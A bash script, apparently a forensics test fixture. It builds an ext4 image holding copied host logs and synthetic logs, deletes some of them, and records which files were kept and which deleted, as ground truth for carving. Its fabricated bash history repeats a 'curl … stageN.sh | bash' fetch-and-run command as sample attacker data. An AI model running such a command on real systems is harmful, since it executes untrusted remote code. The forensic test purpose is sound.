#!/usr/bin/env bash
# Ground truth for carving timestamped artifacts from free space.
#
# Run as root on a disposable Linux host. It builds a 64 MiB ext4 image and
# copies the host's own logs into it twice: one copy stays (kept_*), one is
# deleted (gone_*), so the deleted copies' blocks are free and the kept ones
# are allocated. A web access log, a bash history with timestamps and a btmp
# with failed logins are generated so every format is present.
#
# Outputs in <workdir>: logs.img, originals/ (the source files), truth.json
# (which files were kept and which deleted), sha256.txt.
set -euo pipefail
W=${1:-/tmp/rf-carve-logs}
MNT=$W/mnt
rm -rf "$W"; mkdir -p "$MNT" "$W/originals"
HOST=$(hostname)

# --- source material ------------------------------------------------------
copy() { [ -r "$1" ] && cp "$1" "$W/originals/$2" || true; }
copy /var/log/syslog syslog
copy /var/log/auth.log auth.log
copy /var/log/dpkg.log dpkg.log
copy /var/log/apt/history.log apt_history.log
copy /var/log/wtmp wtmp
copy /var/log/btmp btmp
copy /var/log/lastlog lastlog
copy /var/log/kern.log kern.log
# synthetic web access log (common log format) and bash history with timestamps
for i in $(seq 1 300); do
  printf '10.0.0.%d - - [%s] "GET /page%d HTTP/1.1" 200 %d "-" "curl/7.81"\n' $((i % 250 + 1)) "$(date -u -d "@$((1793200000 + i * 61))" '+%d/%b/%Y:%H:%M:%S +0000')" "$i" $((100 + i)) >> "$W/originals/access.log"
done
for i in $(seq 1 120); do
  printf '#%d\ncurl -s http://10.10.0.25/stage%d.sh | bash\n' $((1793210000 + i * 37)) "$i" >> "$W/originals/bash_history"
done
# a few failed logins into a fresh btmp-like file: real glibc layout via python
python3 - "$W/originals/btmp_synth" <<'EOF'
import struct, sys
out = open(sys.argv[1], 'wb')
for i in range(50):
    rec = bytearray(384)
    struct.pack_into('<hxxi', rec, 0, 6, 1000 + i)          # LOGIN_PROCESS, pid
    rec[8:17] = b'ssh:notty'                                # ut_line
    rec[44:48] = b'root'                                    # ut_user
    host = b'198.51.100.' + str(i % 9).encode()
    rec[76:76 + len(host)] = host                           # ut_host
    struct.pack_into('<ii', rec, 340, 1793205000 + i * 13, 500000 + i)
    out.write(rec)
EOF
ls -la "$W/originals"

# --- image ----------------------------------------------------------------
dd if=/dev/zero of="$W/logs.img" bs=1M count=64 status=none
mkfs.ext4 -q -F "$W/logs.img"
mount -o loop "$W/logs.img" "$MNT"
mkdir -p "$MNT/var/log" "$MNT/home/bob"
for f in "$W"/originals/*; do
  n=$(basename "$f")
  cp "$f" "$MNT/var/log/kept_$n"
  cp "$f" "$MNT/var/log/gone_$n"
done
cp "$W/originals/bash_history" "$MNT/home/bob/.bash_history"
sync; sleep 1
rm -f "$MNT"/var/log/gone_*
rm -f "$MNT/home/bob/.bash_history"
sync; sleep 1
ls "$MNT/var/log" > "$W/kept.txt"
cd /; umount "$MNT"; rmdir "$MNT"

python3 - "$W" "$HOST" <<'EOF'
import json, os, sys
w, host = sys.argv[1], sys.argv[2]
originals = sorted(os.listdir(f'{w}/originals'))
json.dump(dict(host=host, originals=originals, kept=[f'kept_{n}' for n in originals], gone=[f'gone_{n}' for n in originals] + ['.bash_history']),
          open(f'{w}/truth.json', 'w'), indent=1)
EOF
( cd "$W" && sha256sum logs.img truth.json originals/* > sha256.txt && tail -3 sha256.txt )
echo done
